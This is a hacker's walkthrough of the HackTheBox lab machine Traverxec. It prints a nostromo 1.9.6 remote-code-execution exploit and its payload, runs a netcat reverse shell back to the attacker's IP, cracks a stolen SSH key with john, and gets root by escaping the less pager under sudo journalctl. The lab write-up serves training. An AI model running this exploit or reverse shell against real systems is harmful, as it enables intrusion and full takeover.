---
title: Traverxec HackTheBox writeup made by a dumb !!!
author: dumbx90
date: 2020-03-29 14:10:00 +0800
categories: [Blogging, HTB, Writeup]
tags: [htb,pentest,linux,easy,retired]
---

![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/hackthebox/traverxec-description.png?raw=true)

<script id="asciicast-TMbUWb7dq1pZZBwuQmiX7g9t0" src="https://asciinema.org/a/TMbUWb7dq1pZZBwuQmiX7g9t0.js" async></script>

## Sumary 

Easy linux machine. After initial recon we discovery the system is running a version of  nostromo that is vulnerable. We get the correct exploit with searchexploit and executed it. After initial shell we found the backup of ssh keys. Transfer for our machine, crack them with john and ssh in the machine with user david. David can run journalctl command that can be used to escape to a root shell. 

## Skills Necessary  

- Enumeration
- Searchsploit
- Password Cracking

## Skills Learned

- **update** the shell in nc 
- Cracking ssh key
- GTFOBins 
- Linux commands




## Recon 

A simple nmap scan reveals only two open ports:

```bash
dumbland () hgfs/hackthebox/traverxec :: nmap --open -Pn -sVC  10.10.10.165 -oA traverexec-default
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-23 10:34 EDT
Nmap scan report for 10.10.10.165
Host is up (0.14s latency).
Not shown: 998 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.03 seconds
```

Lets check looks like main page:

![traverexec-mainpage](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/hackthebox/traverxec-mainpage.png?raw=true)



## Initial foothold 

beside show only two ports open, the nmap scan already have all we need do get a initial shell. The server running in port 80 is **nostromo 1.9.6** . A simple ***searchsploit*** give all we  need to get a shell: 

## Searchsploit

```bash	
dumbland () Documents/learn-notes/writeups-htb :: searchsploit nostromo 1.9.6

nostromo 1.9.6 - Remote Code Execution                      exploits/multiple/remote/47837.py
```

Lets see how the exploits looks like:

```bash	
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/



"""

help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):
    response = ""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except:
        pass
    return response

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":

    print(art)

    try:
        target = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]

        cve(target, port, cmd)


```

The exploit is **fire and forget**.  Just run like the instructions said and get a shell

```bash
dumbland () hgfs/hackthebox/traverxec :: python 47837.py 10.10.10.165 80 'id'

                                        _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




HTTP/1.1 200 OK
Date: Thu, 23 Apr 2020 14:50:43 GMT
Server: nostromo 1.9.6
Connection: close


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Some basic enumeration to see what kind of shell we can get:

```bash
dumbland () hgfs/hackthebox/traverxec :: python 47837.py 10.10.10.165 80 'cat /etc/os-release'
                                        _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




HTTP/1.1 200 OK
Date: Thu, 23 Apr 2020 14:54:24 GMT
Server: nostromo 1.9.6
Connection: close


PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```



## Initial Shell 

Its a debian system, so we can use netcat to get a **reverse shell**: 

```bash
dumbland () hgfs/hackthebox/traverxec :: python 47837.py 10.10.10.165 80 'nc 10.10.14.35 4242 -e bash'                              _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/
```

In other terminal we get our shell:

```bash
dumbland () hgfs/hackthebox/traverxec :: nc -nlvp 4242
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 10.10.10.165.
Ncat: Connection from 10.10.10.165:60202.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



## Upgrade  Shell 101

### rules of dumb

- always use rlwrrap   

  - ```bash
    alias nc='rlwrap nc
    ```

- python upgrade

  - ```bash
    python -c 'import pty;pty.spawn("/bin/bash")'
    ```

- script update

  - ```bash
    script /dev/null
    ```

- After choose your poison(feel free to use all) update the tty:

  - ```bash	
    export SHELL=bash;export TERM=xterm256-color;stty rows 38 columns 116
    ```

In the end our reverse shell is look like this:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
script /dev/null
Script started, file is /dev/null
$ export SHELL=bash;export TERM=xterm256-color;stty rows 38 columns 116
export SHELL=bash;export TERM=xterm256-color;stty rows 38 columns 116
$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$
```



## Priv Escalation 

### Lateral movement

Now we get a shell lets lookup for passwords or other **low hang fruits**. The natural choice is see what kind of files we have in **/var/nostromo** , after all, this is a **web server**:

```bash
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

As we can see the web server is running in a folder ***public_www***  located  home directory of david user. Lets see if we found some thing there:

```bash
www-data@traverxec:/home/david/public_www$ ls -alh
ls -alh
total 16K
drwxr-xr-x 3 david david 4.0K Oct 25 15:45 .
drwx--x--x 5 david david 4.0K Oct 25 17:02 ..
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4.0K Oct 25 17:02 protected-file-area
www-data@traverxec:/home/david/public_www$ ls -alh protected-file-area
ls -alh protected-file-area
total 16K
drwxr-xr-x 2 david david 4.0K Oct 25 17:02 .
drwxr-xr-x 3 david david 4.0K Oct 25 15:45 ..
-rw-r--r-- 1 david david   45 Oct 25 15:46 .htaccess
-rw-r--r-- 1 david david 1.9K Oct 25 17:02 backup-ssh-identity-files.tgz
```



Looks like we found the ssh backup keys. let copy that and try to use to get a ssh conection with ***david*** user:

```bash
www-data@traverxec:/home/david/public_www/protected-file-area$ cp *.tgz /tmp
cp *.tgz /tmp
www-data@traverxec:/home/david/public_www/protected-file-area$ cd /tmp
cd /tmp
www-data@traverxec:/tmp$ ls
ls
backup-ssh-identity-files.tgz
systemd-private-c5be4f458cda404e998e25081cd5ebc2-systemd-timesyncd.service-QzNMZB
vmware-root
vmware-root_556-2966037836
www-data@traverxec:/tmp$ tar zxpvf backup-ssh-identity-files.tgz
tar zxpvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
www-data@traverxec:/tmp$
```

We have the private key of david. Lets try to use them:

```bash
dumbland () hgfs/hackthebox/traverxec :: ssh -i id_rsa-david david@10.10.10.165
Enter passphrase for key 'id_rsa-david'
```

The result was not like expected - We need the password. 

## JohnTheRipper 

We try to crack the password of private key using  ***john***.  Before that we can extract the hash from private key using ***ssh2john*** commnad:

```bash	
dumbland () hgfs/hackthebox/traverxec :: /usr/share/john/ssh2john.py id_rsa-david
dumbland () hgfs/hackthebox/traverxec :: /usr/share/john/ssh2john.py id_rsa-david
david:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7
f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828a
ee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1
725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172
aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7
021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f
06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb3640
8497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecd
a431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a8
56f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07
ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f37
80b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406
f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b
28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cd
aef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa9
7a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7
e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa
8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99d
ba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57
e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7
f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386
a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b
557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b
79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf1
6718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b1
8372abb34685a30264cdfcf57655b10a283ff0
```

Save this in a file and crack them with ***john***:

```bash
dumbland () hgfs/hackthebox/traverxec :: sudo john david-john-key.txt -w=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
```



## Shell with david user

Now we have a password of ssh key we can ssh in the machine with **david** user:

``` bash
dumbland () hgfs/hackthebox/traverxec :: ssh -i id_rsa-david david@10.10.10.165
Enter passphrase for key 'id_rsa-david':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ id
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
david@traverxec:~$ ls
bin  public_www  user.txt
```



In the last command we see the user has a folder called ***bin*** in the home directory. Lets dive into it:

```
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls -alh
total 16K
drwx------ 2 david david 4.0K Oct 25 16:26 .
drwx--x--x 5 david david 4.0K Oct 25 17:02 ..
-r-------- 1 david david  802 Oct 25 16:26 server-stats.head
-rwx------ 1 david david  363 Oct 25 16:26 server-stats.sh
david@traverxec:~/bin$ cat *.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```



So, appear that user **david** can run ***journalctl*** . This particular binary use ***lesss*** to display in tty terminal. (See links  below to better understanding this behavior ). So all we have to do is execute last line of script and escape to shell typing ***!#/bin/bassh***. But there is a trick here - ***less*** only will be invocate bu ***journalctl*** if the terminal is less than file wil be display. So resize your terminal  to lower  rows and columns:

```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Thu 2020-04-23 10:18:36 EDT, end at Thu 2020-04-23 11:42:32 EDT. --
Apr 23 10:18:41 traverxec systemd[1]: Starting nostromo nhttpd server...
Apr 23 10:18:41 traverxec systemd[1]: nostromo.service: Can't open PID file /var/nostromo/logs/nhttpd.pid (yet?) af
Apr 23 10:18:41 traverxec nhttpd[458]: started
Apr 23 10:18:41 traverxec systemd[1]: Started nostromo nhttpd server.
Apr 23 10:18:41 traverxec nhttpd[458]: max. file descriptors = 1040 (cur) / 1040 (max)
lines 1-6/6 (END)
```



As we can see we cath the execution of ***less*** command:

```bash
Apr 23 10:18:41 traverxec nhttpd[458]: max. file descriptors = 1040 (cur) / 1040 (max)
!/bin/bash
root@traverxec:/home/david/bin# id
uid=0(root) gid=0(root) groups=0(root)
root@traverxec:/home/david/bin# ls /root
nostromo_1.9.6-1.deb  root.txt
root@traverxec:/home/david/bin#
```





## Tools used in this post

- https://github.com/offensive-security/exploitdb
- https://github.com/magnumripper/JohnTheRipper

## Terminal Customization 

- https://eugeny.github.io/terminus/

- https://ohmyz.sh/ (afowler theme)

- https://github.com/samoshkin/tmux-config

  

## Reference Links

- https://gtfobins.github.io/